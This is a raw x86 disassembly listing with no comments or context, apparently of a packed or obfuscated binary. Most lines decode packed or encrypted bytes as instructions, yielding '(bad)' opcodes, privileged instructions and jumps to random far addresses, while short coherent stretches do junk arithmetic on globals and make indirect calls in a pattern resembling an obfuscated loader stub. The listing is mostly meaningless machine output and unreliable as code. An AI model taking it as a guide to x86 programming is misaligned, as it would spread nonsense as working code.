  417d6b:	xor    eax,0xbd8b1ad4
  417d70:	(bad)  
  417d71:	sub    bh,BYTE PTR [ecx-0x66]
  417d74:	ins    BYTE PTR es:[edi],dx
  417d75:	push   esp
  417d76:	sub    eax,DWORD PTR [edx]
  417d78:	fisub  WORD PTR [ebx+ebp*8-0x1f]
  417d7c:	jmp    0x417df5
  417d7e:	in     al,dx
  417d7f:	inc    ecx
  417d80:	dec    esp
  417d81:	(bad)  
  417d82:	scas   al,BYTE PTR es:[edi]
  417d83:	inc    ebx
  417d84:	fsub   QWORD PTR [ebx-0x5f861703]
  417d8a:	and    eax,0x9a7c9615
  417d8f:	call   0x6c1d:0x17a638d8
  417d96:	sbb    ebx,edi
  417d98:	mul    BYTE PTR [edx-0x13a7b07f]
  417d9e:	int    0x2c
  417da0:	sar    BYTE PTR [eax-0x5d573e11],0x13
  417da7:	mov    eax,ds:0x2b4441e9
  417dac:	je     0x417d7c
  417dae:	pop    ecx
  417daf:	jmp    0x417dee
  417db1:	test   BYTE PTR [eax],ch
  417db3:	addr16 jg 0x417dc2
  417db6:	adc    al,0x99
  417db8:	inc    ebp
  417db9:	shr    DWORD PTR gs:[ebx-0x25],0xb0
  417dbe:	fnstenv [edi]
  417dc0:	and    BYTE PTR [ecx],ah
  417dc2:	and    BYTE PTR [esi-0x22ea12dc],cl
  417dc8:	jecxz  0x417e23
  417dca:	(bad)  
  417dcb:	mov    ebx,0x792e6fc0
  417dd0:	jp     0x417e4e
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	add    eax,0xf870def7
  417dd8:	enter  0x28f2,0x48
  417ddc:	ret    
  417ddd:	adc    edx,DWORD PTR [ebx]
  417ddf:	mov    ds:0x92f0fb65,eax
  417de4:	xor    al,0x44
  417de6:	sbb    eax,0xe814e444
  417deb:	push   edx
  417dec:	mov    dh,0xb5
  417dee:	lea    edi,[ecx+0x4f]
  417df1:	adc    eax,0x8ea0461
  417df6:	(bad)  
  417df7:	mov    al,BYTE PTR [ebp-0x2140fe77]
  417dfd:	adc    bl,cl
  417dff:	add    ah,BYTE PTR [ecx]
  417e01:	invd   
  417e03:	push   ds
  417e04:	dec    eax
  417e05:	dec    ecx
  417e06:	outs   dx,DWORD PTR ds:[esi]
  417e07:	mov    esi,0x1b89c1ea
  417e0c:	mov    edi,0x890b542c
  417e11:	or     al,0xc7
  417e13:	adc    dl,BYTE PTR [eax+0x76]
  417e16:	adc    edx,eax
  417e18:	in     eax,0x89
  417e1a:	add    DWORD PTR [ebx-0x8ec5608],eax
  417e20:	mov    bh,cl
  417e22:	jge    0x417e4e
  417e24:	popf   
  417e25:	sti    
  417e26:	or     edx,edx
  417e28:	cmp    eax,0xbc62bb5a
  417e2d:	and    cl,cl
  417e2f:	mov    al,ds:0x11d95945
  417e34:	fmul   QWORD PTR [edi+0x7369d927]
  417e3a:	dec    eax
  417e3b:	sbb    dl,BYTE PTR [ecx+0x29160b7f]
  417e41:	ret    
  417e42:	jnp    0x417eb4
  417e44:	je     0x417e2e
  417e46:	loopne 0x417ea9
  417e48:	sbb    eax,0x231fb945
  417e4d:	sub    cl,ch
  417e4f:	aad    0xcc
  417e51:	pop    esp
  417e52:	mov    ds:0x80548133,eax
  417e57:	leave  
  417e58:	stos   DWORD PTR es:[edi],eax
  417e59:	popa   
  417e5a:	scas   eax,DWORD PTR es:[edi]
  417e5b:	dec    ebx
  417e5d:	cmp    bh,dl
  417e5f:	ins    BYTE PTR es:[edi],dx
  417e60:	sbb    DWORD PTR [esi],edx
  417e62:	ror    DWORD PTR [edi],1
  417e64:	and    eax,0xd2f8384e
  417e69:	mov    edx,DWORD PTR [ebp+0x75034988]
  417e6f:	(bad)  
  417e70:	adc    ch,dh
  417e72:	outs   dx,DWORD PTR ds:[esi]
  417e73:	xor    esp,DWORD PTR [esi-0x28b22ccd]
  417e79:	jne    0x417e8a
  417e7b:	pop    esi
  417e7c:	imul   esi,DWORD PTR [ebp+0x52],0xfffffffd
  417e80:	pop    ds
  417e81:	mov    eax,ds:0x7ce48b99
  417e86:	(bad)  
  417e88:	daa    
  417e89:	pop    esp
  417e8a:	ds loopne 0x417e8f
  417e8d:	test   al,0x37
  417e8f:	or     BYTE PTR [esi+0x58d9efaa],ah
  417e95:	inc    esi
  417e96:	sub    dl,BYTE PTR [ebx+0x8]
  417e99:	xor    eax,0x60c605f7
  417e9e:	push   edi
  417e9f:	std    
  417ea0:	pop    ds
  417ea1:	lock mov WORD PTR [eax],?
  417ea4:	sbb    bh,BYTE PTR [ebx]
  417ea6:	jp     0x417eaf
  417ea8:	jmp    0x417ee2
  417eaa:	adc    al,0xfc
  417eac:	push   ebp
  417ead:	mov    bh,0x9d
  417eaf:	fisttp QWORD PTR [ebx+0x6f]
  417eb2:	mov    DWORD PTR [esp+0x3c],0x63d5
  417eba:	mov    DWORD PTR ds:0x42836f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428233,0x42828b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428383,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42827f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42837b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428383,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e88
  417f43:	sub    DWORD PTR ds:0x428257,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42823b
  417f53:	mov    ecx,DWORD PTR ds:0x42829b
  417f59:	and    DWORD PTR ds:0x428197,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428373
  417f65:	mov    ecx,DWORD PTR ds:0x428187
  417f6b:	or     DWORD PTR ds:0x42831b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x42839f
  417f77:	or     DWORD PTR ds:0x428287,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0xffffffba
  417f8f:	mov    gs,WORD PTR [ecx]
  417f91:	stos   BYTE PTR es:[edi],al
  417f92:	push   ebx
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x9f81818],bh
  417f9c:	dec    esi
  417f9d:	daa    
  417f9e:	jmp    0x7388:0x29c14e8f
  417fa5:	mov    al,ds:0xce52cff9
  417faa:	dec    ebx
  417fab:	adc    al,0xb6
  417fad:	sar    BYTE PTR [eax+0x6228720],1
  417fb3:	rcl    DWORD PTR [edi],0x4c
  417fb6:	fdiv   QWORD PTR [edx]
  417fb8:	bnd jmp 0xef9027e1
  417fbe:	ret    
  417fbf:	xor    DWORD PTR [ebp-0x1e],ecx
  417fc2:	(bad)  
  417fc3:	and    al,0xba
  417fc5:	out    0xb,eax
  417fc7:	mov    eax,ds:0x2c9dd222
  417fcc:	dec    esi
  417fcd:	aaa    
  417fce:	cmc    
  417fcf:	shl    esi,cl
  417fd1:	mov    esp,0x2994ea18
  417fd6:	sbb    DWORD PTR ds:0xff0f5817,0xffffffc7
  417fdd:	(bad)  
  417fde:	mov    ds:0xd27239e6,al
  417fe3:	enter  0xb9a8,0x12
  417fe7:	sbb    eax,0x76a0c1af
  417fec:	fcom   DWORD PTR es:[esi]
  417fef:	aaa    
  417ff0:	xor    eax,0x96badf10
  417ff5:	mov    al,0xff
  417ff7:	dec    edx
  417ff8:	test   al,0x57
  417ffa:	or     al,0x45
  417ffc:	mov    ds:0xaf291242,eax
  418001:	inc    eax
  418002:	enter  0x2e24,0xc4
  418006:	call   0x54e54d92
  41800b:	mov    ah,0x84
  41800d:	lds    ebp,FWORD PTR [ecx+0x251da803]
  418013:	mov    dl,0x97
  418015:	(bad)  
  418017:	xchg   esp,eax
  418018:	xor    BYTE PTR [ebx+0x79bf3f24],dl
  41801e:	jmp    0x418047
  418020:	popa   
  418021:	out    0x51,eax
  418023:	sbb    ecx,ebp
  418025:	retf   0x63f0
  418028:	pop    ss
  418029:	pop    ds
  41802a:	iret   
  41802b:	push   cs
  41802c:	not    DWORD PTR [edi-0x4be05c8f]
  418032:	xchg   BYTE PTR [esi],cl
  418034:	mov    ds:0x3d53fc26,al
  418039:	dec    esi
  41803a:	mov    ch,0x6
  41803c:	vandps xmm6,xmm0,XMMWORD PTR [ebp-0x49]
  418041:	cs out 0x45,al
  418044:	cmp    eax,0x3a478ae2
  418049:	cwde   
  41804a:	cmp    ebp,DWORD PTR [edx+0x3f80c4d0]
  418050:	sub    eax,0x66df9bc3
  418055:	mov    esi,0xbd9683f2
  41805a:	in     al,0x5f
  41805c:	test   DWORD PTR [edx+0x8],ebp
  41805f:	popa   
  418060:	call   0x35c76fad
  418065:	stos   DWORD PTR es:[edi],eax
  418066:	sub    DWORD PTR [ebp+0x25],ebx
  418069:	mov    ds:0xec815e90,al
  41806e:	xchg   edx,eax
  41806f:	xor    al,0x54
  418071:	arpl   WORD PTR [esi+ebx*8],di
  418074:	out    0x4a,al
  418076:	stc    
  418077:	dec    ecx
  418078:	xchg   esp,eax
  418079:	mov    ecx,0x79f3265c
  41807e:	test   eax,0x9705717
  418083:	and    esi,eax
  418085:	adc    edi,DWORD PTR [ecx-0x73]
  418088:	pop    esi
  418089:	xor    DWORD PTR [eax],ebx
  41808b:	cli    
  41808c:	mov    eax,DWORD PTR [ebx+edx*1+0x21e44773]
  418093:	das    
  418094:	inc    esi
  418095:	jp     0x4180de
  418097:	cdq    
  418098:	rol    cl,cl
  41809a:	scas   eax,DWORD PTR es:[edi]
  41809b:	inc    eax
  41809c:	fwait
  41809d:	shl    BYTE PTR [edx+0x54f15da6],0xd1
  4180a4:	jbe    0x4180bd
  4180a6:	imul   eax,DWORD PTR [edx+0x47],0xffffffca
  4180aa:	test   al,0x56
  4180ac:	ins    BYTE PTR es:[edi],dx
  4180ad:	repnz (bad) 
  4180af:	shr    DWORD PTR ds:[edx-0x66],cl
  4180b3:	dec    ecx
  4180b4:	lds    edx,FWORD PTR [edx]
  4180b6:	pop    ss
  4180b7:	xor    eax,0xa3940bd2
  4180bc:	arpl   dx,bp
  4180be:	ss mov esp,0x955db942
  4180c4:	js     0x418061
  4180c6:	ja     0x418113
  4180c8:	aad    0xd
  4180ca:	loope  0x4180f0
  4180cc:	retf   0x482c
  4180cf:	mov    edi,0x45ba23e3
  4180d4:	mov    ds:0x2cef0800,eax
  4180d9:	mov    WORD PTR [edi],fs
  4180db:	push   cs
  4180dc:	or     BYTE PTR [ebp-0x75],0x20
  4180e0:	loop   0x4180ea
  4180e2:	jmp    0xe6bfd14f
  4180e7:	out    dx,al
  4180e8:	(bad)  
  4180ea:	push   0xffffff96
  4180ec:	(bad)
  4180f0:	fsubr  DWORD PTR [ecx-0x49]
  4180f3:	popf   
  4180f4:	or     dh,BYTE PTR [edx-0x39]
  4180f7:	mov    bl,BYTE PTR [edi+ebx*4+0x1ddc5461]
  4180fe:	add    edx,DWORD PTR [ecx]
  418100:	or     ch,BYTE PTR [ecx-0x2f5cd3f5]
  418106:	outs   dx,BYTE PTR ds:[esi]
  418107:	aaa    
  418108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418109:	mov    ds:0x2a6d6b87,eax
  41810e:	outs   dx,BYTE PTR ds:[esi]
  41810f:	jnp    0x1999d76c
  418115:	fstp   QWORD PTR [ecx-0x38]
  418118:	add    DWORD PTR [edi],edx
  41811a:	mov    eax,0x665f114
  41811f:	sub    eax,0xc003925b
  418124:	sbb    DWORD PTR [esi],ebp
  418126:	mov    ah,0x9b
  418128:	jo     0x4180b4
  41812a:	pop    esp
  41812b:	pop    ebx
  41812c:	nop
  41812d:	mov    cl,0xf6
  41812f:	clc    
  418130:	pusha  
  418131:	retf   
  418132:	cmp    ebx,DWORD PTR [edx]
  418134:	sub    bl,BYTE PTR [esi+edx*2-0x8]
  418138:	push   ebp
  418139:	mov    ecx,0x9d2f1950
  41813e:	test   BYTE PTR [ebx-0x389ab08a],cl
  418144:	ins    BYTE PTR es:[edi],dx
  418145:	mov    al,ds:0x6d58f29
  41814a:	lock lds ebx,FWORD PTR [ebp-0x520f2230]
  418151:	sub    BYTE PTR [ecx+0x39],ch
  418154:	mov    dl,BYTE PTR [ebx+0x7f]
  418157:	jge    0x418196
  418159:	inc    eax
  41815a:	sbb    al,0x26
  41815c:	mov    eax,DWORD PTR [eax]
  41815e:	mov    ds:0xaaabf33d,eax
  418163:	mov    esp,0x6b61a6f8
  418168:	es sbb eax,0x90a813a0
  41816e:	mov    al,ds:0x70b92766
  418173:	sar    DWORD PTR [eax-0x4e64f4f3],1
  418179:	jb     0x41816f
  41817b:	pop    eax
  41817c:	push   cs
  41817d:	jno    0x4181ae
  41817f:	add    bl,BYTE PTR [edx+0x67]
  418182:	not    DWORD PTR [ebx]
  418184:	adc    bh,BYTE PTR [edx+0x43]
  418187:	sbb    al,0xba
  418189:	fmul   DWORD PTR [eax+0x22c8d3be]
  41818f:	jle    0x41820a
  418191:	mov    ch,0x57
  418193:	cs fwait
  418195:	and    ebp,ebx
  418197:	mov    edx,0xf8891939
  41819c:	enter  0xd390,0x4f
  4181a0:	int    0x88
  4181a2:	and    DWORD PTR [ebp+eax*8+0x47400baf],eax
  4181a9:	jl     0x4181a5
  4181ab:	adc    al,0x32
  4181ad:	imul   DWORD PTR [eax+0x35cd13c7]
  4181b3:	xlat   BYTE PTR ds:[ebx]
  4181b4:	iretw  
  4181b6:	jg     0x418171
  4181b8:	pop    DWORD PTR [edx+0x193e8046]
  4181be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181bf:	mov    ds:0x205e76fa,al
  4181c4:	pop    esi
  4181c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c6:	aad    0x2f
  4181c8:	cmp    al,0xe9
  4181ca:	jp     0x418220
  4181cc:	std    
  4181cd:	inc    edx
  4181ce:	adc    eax,0xd77c5206
  4181d3:	push   eax
  4181d4:	sub    esi,DWORD PTR [ebp-0x4c7abb4d]
  4181da:	(bad)  
  4181db:	out    0x81,eax
  4181dd:	int3   
  4181de:	scas   al,BYTE PTR es:[edi]
  4181df:	add    al,0x13
  4181e1:	out    dx,al
  4181e2:	in     eax,dx
  4181e3:	and    ebx,edx
  4181e5:	call   0xee51d217
  4181ea:	ret    
  4181eb:	mov    fs,esi
  4181ed:	push   0x2
  4181ef:	or     eax,0xc7bef4fa
  4181f4:	out    0x14,al
  4181f6:	inc    esi
  4181f7:	add    BYTE PTR [ecx+0x2d],bh
  4181fa:	mov    eax,ds:0x74d7f026
  4181ff:	mov    bh,0xd8
  418201:	mov    ecx,0x3be80732
  418206:	jle    0x4181c7
  418208:	outs   dx,BYTE PTR ds:[esi]
  418209:	xor    bh,dh
  41820b:	test   BYTE PTR [ebx],ah
  41820d:	inc    edx
  41820e:	lods   eax,DWORD PTR ds:[esi]
  41820f:	imul   ebp,esi,0xbdef394b
  418215:	jmp    0x8bbd:0x79431ab8
  41821c:	sbb    BYTE PTR [ebp-0x66],bh
  41821f:	or     edi,esp
  418221:	sub    al,0xc7
  418223:	sbb    BYTE PTR [esi],ah
  418225:	test   al,0xfc
  418227:	outs   dx,BYTE PTR ds:[esi]
  418228:	cld    
  418229:	or     DWORD PTR [ecx-0x74],ebp
  41822c:	and    al,BYTE PTR [eiz*8-0x3222393a]
  418233:	hlt    
  418234:	mov    eax,0x40983b08
  418239:	push   edx
  41823a:	jb     0x418217
  41823c:	cli    
  41823d:	repnz leave 
  41823f:	out    dx,al
  418240:	cmp    eax,0xb139f016
  418245:	and    edi,DWORD PTR [edi-0x2e79f166]
  41824b:	pop    edi
  41824c:	pop    esp
  41824d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824e:	fwait
  41824f:	enter  0x261b,0x94
  418253:	xchg   edx,eax
  418254:	aaa    
  418255:	cmp    ecx,DWORD PTR [ebp-0x2d]
  418258:	pusha  
  418259:	mov    esi,0x3e4ffe8f
  41825e:	lds    esp,FWORD PTR [eax-0x7ffe8bb9]
  418264:	mov    eax,DWORD PTR [edi]
  418266:	iret   
  418267:	mov    esi,0xbe12e293
  41826c:	push   eax
  41826d:	in     eax,dx
  41826e:	mov    BYTE PTR [edx+edi*8-0x5d],ch
  418272:	add    DWORD PTR [ebp+0x1d],ecx
  418275:	mov    bh,0xc9
  418277:	adc    al,0x48
  418279:	ds mov ecx,0xd8c4621f
  41827f:	fs (bad) 
  418281:	sub    ebp,DWORD PTR fs:[edx-0x5ee6930f]
  418288:	lods   eax,DWORD PTR ds:[esi]
  418289:	ja     0x4182b7
  41828b:	adc    bh,BYTE PTR [eax+eiz*8+0x5bf4e13a]
  418292:	sahf   
  418293:	mov    esp,0x7a0a97e4
  418298:	or     BYTE PTR [ecx+0x2481fea5],al
  41829e:	push   edi
  41829f:	sub    ah,dh
  4182a1:	add    al,0x4
  4182a3:	xchg   edx,eax
  4182a4:	and    DWORD PTR [edi-0x14f1f80e],esp
  4182aa:	xor    BYTE PTR [ecx],dh
  4182ac:	sbb    al,0x5d
  4182ae:	out    dx,eax
  4182af:	dec    edx
  4182b0:	mov    eax,ds:0x6532964e
  4182b5:	adc    DWORD PTR [ebp+0x4347688d],eax
  4182bb:	hlt    
  4182bc:	sbb    eax,0x4d35e577
  4182c1:	je     0x4182a9
  4182c3:	xor    ebp,DWORD PTR [ebp+0x58]
  4182c6:	dec    esp
  4182c7:	add    bl,BYTE PTR [eax+edi*1+0x5902e784]
  4182ce:	adc    eax,0x8ae61d6
  4182d3:	outs   dx,DWORD PTR ds:[esi]
  4182d4:	sbb    DWORD PTR [edi+0x5ddc292c],eax
  4182da:	push   es
  4182db:	cli    
  4182dc:	push   edx
  4182dd:	loope  0x4182e1
  4182df:	pushf  
  4182e0:	out    dx,eax
  4182e1:	out    0xab,eax
  4182e3:	jbe    0x4182b8
  4182e5:	or     al,0x15
  4182e7:	shr    ch,0xb8
  4182ea:	cmp    ah,BYTE PTR ds:[ebp-0x15]
  4182ee:	lods   al,BYTE PTR ds:[esi]
  4182ef:	pop    esi
  4182f0:	jp     0x4182b1
  4182f2:	xchg   ebp,eax
  4182f3:	and    DWORD PTR [ebx+0x7a],ebx
  4182f6:	pop    ebp
  4182f7:	sbb    al,bh
  4182f9:	popa   
  4182fa:	shl    DWORD PTR [esi+ecx*2],1
  4182fd:	cmp    DWORD PTR [ecx],0x5fa8b0c6
  418303:	repnz xchg ecx,eax
  418305:	fild   DWORD PTR [eax-0x3ec4e076]
  41830b:	icebp  
  41830c:	clc    
  41830d:	std    
  41830e:	sub    edi,DWORD PTR [ebp-0x5a33f33a]
  418314:	jae    0x418297
  418316:	das    
  418317:	cdq    
  418318:	lds    ecx,FWORD PTR [ebp+0x33]
  41831b:	ins    BYTE PTR es:[edi],dx
  41831c:	add    bl,BYTE PTR [eax]
  41831e:	pop    ecx
  41831f:	repnz dec ebp
  418321:	push   ecx
  418322:	test   al,0x76
  418324:	jmp    DWORD PTR [edx+0x7d]
  418327:	es dec edx
  418329:	sbb    BYTE PTR [ecx],0x6b
  41832c:	cmp    BYTE PTR [ecx-0x7e081aad],0xa8
  418333:	ss dec ebp
  418335:	(bad)  
  418336:	xor    ch,BYTE PTR [esi]
  418338:	call   0xca76:0x359db696
  41833f:	ret    
  418340:	jl     0x4183a1
  418342:	push   es
  418343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418344:	cmp    eax,0xa6966c13
  418349:	xchg   esi,eax
  41834a:	jmp    0x2444:0x8b30ff16
  418351:	xor    al,0x83
  418353:	cmp    eax,0x428187
  418358:	add    bh,al
  41835a:	add    eax,0x42824b
  41835f:	mov    BYTE PTR [edx+0x0],0x0
  418363:	mov    DWORD PTR ds:0x428387,edx
  418369:	mov    DWORD PTR ds:0x428163,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428287,0x243f
  418382:	mov    DWORD PTR ds:0x42825f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428187,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428323
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e8c
  4183ae:	add    DWORD PTR ds:0x4282ef,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428273
  4183ba:	xor    DWORD PTR ds:0x428327,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428303
  4183c6:	or     DWORD PTR ds:0x42817f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42822b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42822f,0x42819b
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42818f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42838f
  418409:	or     DWORD PTR ds:0x428387,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42815f,0x428327
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42822b,0x0
  418430:	mov    DWORD PTR ds:0x42823b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428383,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42822b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428083
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428de8
  41846b:	sbb    DWORD PTR ds:0x42826f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428167,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428383
  418485:	xor    ecx,DWORD PTR ds:0x4282eb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428387,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x4282ff,0x42826b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283a7,0x42822f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x4282fb,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	xchg   ebp,eax
  4184f8:	and    ecx,DWORD PTR [edi+0x7e]
  4184fb:	not    cl
  4184fd:	push   ss
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x33ce1818],bh
  418505:	repz neg DWORD PTR [ebx]
  418508:	mov    eax,ds:0x92603646
  41850d:	cmp    DWORD PTR [ebp+0x265ae3ad],edx
  418513:	dec    ebp
  418514:	in     al,dx
  418515:	out    dx,al
  418516:	lea    edi,[eax-0x585564a3]
  41851c:	test   DWORD PTR [ecx-0x41],ecx
  41851f:	jo     0x418563
  418521:	mov    WORD PTR [ebx-0x42d3f8b7],ds
  418527:	shl    DWORD PTR [ecx],1
  418529:	outs   dx,DWORD PTR ds:[esi]
  41852a:	stos   DWORD PTR es:[edi],eax
  41852b:	sahf   
  41852c:	jnp    0x4184db
  41852e:	fisubr DWORD PTR [eax]
  418530:	fidivr DWORD PTR [esi]
  418532:	inc    ebx
  418533:	dec    ecx
  418534:	inc    edi
  418535:	fnsave [edx+0x4c5a4b7d]
  41853b:	lock or al,0xc
  41853e:	scas   eax,DWORD PTR es:[edi]
  41853f:	push   0x40
  418541:	jl     0x4184e2
  418543:	repz sbb edi,ebx
  418546:	jle    0x418584
  418548:	jb     0x4184e3
  41854a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854b:	call   0x73981c69
  418550:	jge    0x418520
  418552:	(bad)  
  418553:	scas   al,BYTE PTR es:[edi]
  418554:	cdq    
  418555:	aaa    
  418556:	hlt    
  418557:	mov    gs,WORD PTR [esi]
  418559:	fnsave [edi]
  41855b:	daa    
  41855c:	aam    0xbc
  41855e:	or     BYTE PTR [ecx+0x36],0x94
  418562:	pusha  
  418563:	or     BYTE PTR [ecx-0x79e38839],al
  418569:	popf   
  41856a:	mov    eax,DWORD PTR [ecx-0x26097444]
  418570:	cmp    bl,BYTE PTR [ebp-0x31f3e08d]
  418576:	inc    ecx
  418577:	mov    esi,cr7
  41857a:	add    bh,BYTE PTR [esi]
  41857c:	icebp  
  41857d:	inc    edx
  41857e:	aad    0x40
  418580:	pop    ecx
  418581:	stos   BYTE PTR es:[edi],al
  418582:	(bad)  
  418584:	lods   al,BYTE PTR ds:[esi]
  418585:	fdiv   DWORD PTR [eax-0x44]
  418588:	push   esi
  418589:	scas   al,BYTE PTR es:[edi]
  41858a:	pop    ebx
  41858b:	stos   DWORD PTR es:[edi],eax
  41858c:	sbb    al,0xa7
  41858e:	sbb    ecx,DWORD PTR [ebx+0x6d]
  418591:	sub    dh,bh
  418593:	in     al,0xfb
  418595:	nop
  418596:	xchg   ecx,eax
  418597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418598:	push   edi
  418599:	dec    ebp
  41859a:	pop    esp
  41859b:	cmp    BYTE PTR [ebp+0x1a],ch
  41859e:	mov    eax,0x1070b941
  4185a3:	sbb    eax,0x1aacc888
  4185a8:	dec    esi
  4185a9:	push   ebp
  4185aa:	stc    
  4185ab:	mov    ebx,0x2228c4ae
  4185b0:	and    BYTE PTR [esi+edx*1-0x1732f991],dl
  4185b7:	test   edx,eax
  4185b9:	lds    edi,FWORD PTR [eax]
  4185bb:	sbb    ah,cl
  4185bd:	xchg   esi,eax
  4185be:	push   esp
  4185bf:	fimul  DWORD PTR [ebx]
  4185c1:	in     al,dx
  4185c2:	or     al,0xf4
  4185c4:	imul   edx,DWORD PTR [edi+0x6],0x8c75427
  4185cb:	cmp    eax,0x79c69813
  4185d0:	jae    0x4185c1
  4185d2:	xchg   ecx,esi
  4185d4:	ss repz pop ss
  4185d7:	(bad)  
  4185d8:	pop    ecx
  4185d9:	sbb    al,cl
  4185db:	mov    ecx,0x94d408a5
  4185e0:	loopne 0x4185c8
  4185e2:	push   eax
  4185e3:	int    0x23
  4185e5:	mov    bl,0x7d
  4185e7:	hlt    
  4185e8:	or     dh,ah
  4185ea:	pusha  
  4185eb:	mov    ebp,0x6d52c2a1
  4185f0:	mov    ds:0xd82fe47a,eax
  4185f5:	dec    edx
  4185f6:	mov    eax,0x8073c328
  4185fb:	into   
  4185fc:	pusha  
  4185fd:	pushf  
  4185fe:	xchg   edx,eax
  4185ff:	adc    DWORD PTR [ebx+0x55],ebp
  418602:	inc    ecx
  418603:	fst    DWORD PTR [esi-0x759b46c5]
  418609:	add    BYTE PTR [edx+0x3d5cbdd2],al
  41860f:	aas    
  418610:	aad    0xc6
  418612:	fisub  WORD PTR [esi]
  418614:	in     eax,0xb6
  418616:	dec    ecx
  418617:	hlt    
  418618:	ins    DWORD PTR es:[edi],dx
  418619:	jo     0x418653
  41861b:	dec    eax
  41861c:	pop    edi
  41861d:	mov    ds:0x5188a148,al
  418622:	and    bl,BYTE PTR [ebp+ecx*4+0x23]
  418626:	jne    0x41866e
  418628:	std    
  418629:	int3   
  41862a:	jne    0x418661
  41862c:	jne    0x4185d3
  41862e:	mov    edi,0x809a6bba
  418633:	pop    esp
  418634:	jl     0x418635
  418636:	lahf   
  418637:	retf   0x2266
  41863a:	dec    edx
  41863b:	or     eax,0x9249d1ed
  418641:	push   ebx
  418642:	repnz test al,0x9c
  418645:	aad    0x7b
  418647:	sbb    al,0xde
  418649:	leave  
  41864a:	push   ecx
  41864b:	pop    ds
  41864c:	inc    ecx
  41864d:	js     0x418615
  41864f:	rcl    ebx,cl
  418651:	xor    ch,0xc7
  418654:	mov    edx,cs
  418656:	(bad)  
  418658:	dec    edx
  418659:	fdiv   DWORD PTR [ebx]
  41865b:	push   cs
  41865c:	sbb    dh,bl
  41865e:	mov    eax,0x6e61848c
  418663:	cwde   
  418664:	cmp    ecx,DWORD PTR [ebx-0x4b]
  418667:	bound  ebp,QWORD PTR [edi]
  418669:	dec    edx
  41866a:	push   0xffffffa8
  41866c:	cli    
  41866d:	(bad)
  418670:	xor    al,0x0
  418672:	dec    esi
  418673:	jge    0x41869b
  418675:	or     DWORD PTR fs:[edi+ebp*4-0x24],0x55c17ef8
  41867e:	scas   al,BYTE PTR es:[edi]
  41867f:	out    dx,eax
  418680:	scas   al,BYTE PTR es:[edi]
  418681:	int3   
